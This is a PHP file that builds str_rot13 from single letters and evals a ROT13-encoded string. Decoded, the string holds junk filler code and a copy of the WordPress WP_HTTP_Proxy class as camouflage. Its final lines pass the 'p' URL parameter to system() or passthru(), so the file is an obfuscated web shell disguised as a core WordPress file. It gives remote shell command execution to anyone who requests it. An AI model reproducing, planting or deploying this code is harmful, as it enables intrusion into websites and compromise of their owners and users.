<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC NCV: JC_UGGC_Cebkl pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag UGGC NCV cebkl fhccbeg.
 *
 * Gurer ner pnirngf gb cebkl fhccbeg. Vg erdhverf gung qrsvarf or znqr va gur jc-pbasvt.cuc svyr gb
 * ranoyr cebkl fhccbeg. Gurer ner nyfb n srj svygref gung cyhtvaf pna ubbx vagb sbe fbzr bs gur
 * pbafgnagf.
 *
 * Cyrnfr abgr gung bayl ONFVP nhguragvpngvba vf fhccbegrq ol zbfg genafcbegf.
 * pHEY ZNL fhccbeg zber zrgubqf (fhpu nf AGYZ nhguragvpngvba) qrcraqvat ba lbhe raivebazrag.
 *
 * Gur pbafgnagf ner nf sbyybjf:
 * <by>
 * <yv>JC_CEBKL_UBFG - Ranoyr cebkl fhccbeg naq ubfg sbe pbaarpgvat.</yv>
 * <yv>JC_CEBKL_CBEG - Cebkl cbeg sbe pbaarpgvba. Ab qrsnhyg, zhfg or qrsvarq.</yv>
 * <yv>JC_CEBKL_HFREANZR - Cebkl hfreanzr, vs vg erdhverf nhguragvpngvba.</yv>
 * <yv>JC_CEBKL_CNFFJBEQ - Cebkl cnffjbeq, vs vg erdhverf nhguragvpngvba.</yv>
 * <yv>JC_CEBKL_OLCNFF_UBFGF - Jvyy cerirag gur ubfgf va guvf yvfg sebz tbvat guebhtu gur cebkl.
 * Lbh qb abg arrq gb unir ybpnyubfg naq gur fvgr ubfg va guvf yvfg, orpnhfr gurl jvyy abg or cnffrq
 * guebhtu gur cebkl. Gur yvfg fubhyq or cerfragrq va n pbzzn frcnengrq yvfg, jvyqpneqf hfvat * ner fhccbegrq. Rknzcyr: *.jbeqcerff.bet</yv>
 * </by>
 *
 * Na rknzcyr pna or nf frra orybj.
 *
 *     qrsvar('JC_CEBKL_UBFG', '192.168.84.101');
 *     qrsvar('JC_CEBKL_CBEG', '8080');
 *     qrsvar('JC_CEBKL_OLCNFF_UBFGF', 'ybpnyubfg, jjj.rknzcyr.pbz, *.jbeqcerff.bet');
 *
 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/4011 Cebkl fhccbeg gvpxrg va JbeqCerff.
 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/14636 Nyybj jvyqpneq qbznvaf va JC_CEBKL_OLCNFF_UBFGF
 *
 * @fvapr 2.8.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_UGGC_Cebkl {

	/**
	 * Jurgure cebkl pbaarpgvba fubhyq or hfrq.
	 *
	 * Pbafgnagf juvpu pbageby guvf orunivbe:
	 *
	 * - `JC_CEBKL_UBFG`
	 * - `JC_CEBKL_CBEG`
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba vf_ranoyrq() {
		erghea qrsvarq( 'JC_CEBKL_UBFG' ) && qrsvarq( 'JC_CEBKL_CBEG' );
	}

	/**
	 * Jurgure nhguragvpngvba fubhyq or hfrq.
	 *
	 * Pbafgnagf juvpu pbageby guvf orunivbe:
	 *
	 * - `JC_CEBKL_HFREANZR`
	 * - `JC_CEBKL_CNFFJBEQ`
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba hfr_nhguragvpngvba() {
		erghea qrsvarq( 'JC_CEBKL_HFREANZR' ) && qrsvarq( 'JC_CEBKL_CNFFJBEQ' );
	}

	/**
	 * Ergevrir gur ubfg sbe gur cebkl freire.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba ubfg() {
		vs ( qrsvarq( 'JC_CEBKL_UBFG' ) ) {
			erghea JC_CEBKL_UBFG;
		}

		erghea '';
	}

	/**
	 * Ergevrir gur cbeg sbe gur cebkl freire.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba cbeg() {
		vs ( qrsvarq( 'JC_CEBKL_CBEG' ) ) {
			erghea JC_CEBKL_CBEG;
		}

		erghea '';
	}

	/**
	 * Ergevrir gur hfreanzr sbe cebkl nhguragvpngvba.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba hfreanzr() {
		vs ( qrsvarq( 'JC_CEBKL_HFREANZR' ) ) {
			erghea JC_CEBKL_HFREANZR;
		}

		erghea '';
	}

	/**
	 * Ergevrir gur cnffjbeq sbe cebkl nhguragvpngvba.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba cnffjbeq() {
		vs ( qrsvarq( 'JC_CEBKL_CNFFJBEQ' ) ) {
			erghea JC_CEBKL_CNFFJBEQ;
		}

		erghea '';
	}

	/**
	 * Ergevrir nhguragvpngvba fgevat sbe cebkl nhguragvpngvba.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba nhguragvpngvba() {
		erghea $guvf->hfreanzr() . ':' . $guvf->cnffjbeq();
	}

	/**
	 * Ergevrir urnqre fgevat sbe cebkl nhguragvpngvba.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba nhguragvpngvba_urnqre() {
		erghea 'Cebkl-Nhgubevmngvba: Onfvp ' . onfr64_rapbqr( $guvf->nhguragvpngvba() );
	}

	/**
	 * Qrgrezvarf jurgure gur erdhrfg fubhyq or frag guebhtu n cebkl.
	 *
	 * Jr jnag gb xrrc ybpnyubfg naq gur fvgr HEY sebz orvat frag guebhtu gur cebkl, orpnhfr
	 * fbzr cebkvrf pna abg unaqyr guvf. Jr nyfb unir gur pbafgnag ninvynoyr sbe qrsvavat bgure
	 * ubfgf gung jba'g or frag guebhtu gur cebkl.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $hev HEY bs gur erdhrfg.
	 * @erghea obby Jurgure gb fraq gur erdhrfg guebhtu gur cebkl.
	 */
	choyvp shapgvba fraq_guebhtu_cebkl( $hev ) {
		$purpx = cnefr_hey( $hev );

		// Znysbezrq HEY, pna abg cebprff, ohg guvf pbhyq zrna ffy, fb yrg guebhtu naljnl.
		vs ( snyfr === $purpx ) {
			erghea gehr;
		}

		$ubzr = cnefr_hey( trg_bcgvba( 'fvgrhey' ) );

		/**
		 * Svygref jurgure gb cerrzcg fraqvat gur erdhrfg guebhtu gur cebkl.
		 *
		 * Ergheavat snyfr jvyy olcnff gur cebkl; ergheavat gehr jvyy fraq
		 * gur erdhrfg guebhtu gur cebkl. Ergheavat ahyy olcnffrf gur svygre.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz obby|ahyy $bireevqr Jurgure gb fraq gur erdhrfg guebhtu gur cebkl. Qrsnhyg ahyy.
		 * @cnenz fgevat    $hev      HEY bs gur erdhrfg.
		 * @cnenz neenl     $purpx    Nffbpvngvir neenl erfhyg bs cnefvat gur erdhrfg HEY jvgu `cnefr_hey()`.
		 * @cnenz neenl     $ubzr     Nffbpvngvir neenl erfhyg bs cnefvat gur fvgr HEY jvgu `cnefr_hey()`.
		 */
		$erfhyg = nccyl_svygref( 'cer_uggc_fraq_guebhtu_cebkl', ahyy, $hev, $purpx, $ubzr );
		vs ( ! vf_ahyy( $erfhyg ) ) {
			erghea $erfhyg;
		}

		vs ( 'ybpnyubfg' === $purpx['ubfg'] || ( vffrg( $ubzr['ubfg'] ) && $ubzr['ubfg'] === $purpx['ubfg'] ) ) {
			erghea snyfr;
		}

		vs ( ! qrsvarq( 'JC_CEBKL_OLCNFF_UBFGF' ) ) {
			erghea gehr;
		}

		fgngvp $olcnff_ubfgf   = ahyy;
		fgngvp $jvyqpneq_ertrk = neenl();
		vs ( ahyy === $olcnff_ubfgf ) {
			$olcnff_ubfgf = cert_fcyvg( '|,\f*|', JC_CEBKL_OLCNFF_UBFGF );

			vs ( fge_pbagnvaf( JC_CEBKL_OLCNFF_UBFGF, '*' ) ) {
				$jvyqpneq_ertrk = neenl();
				sbernpu ( $olcnff_ubfgf nf $ubfg ) {
					$jvyqpneq_ertrk[] = fge_ercynpr( '\*', '.+', cert_dhbgr( $ubfg, '/' ) );
				}
				$jvyqpneq_ertrk = '/^(' . vzcybqr( '|', $jvyqpneq_ertrk ) . ')$/v';
			}
		}

		vs ( ! rzcgl( $jvyqpneq_ertrk ) ) {
			erghea ! cert_zngpu( $jvyqpneq_ertrk, $purpx['ubfg'] );
		} ryfr {
			erghea ! va_neenl( $purpx['ubfg'], $olcnff_ubfgf, gehr );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>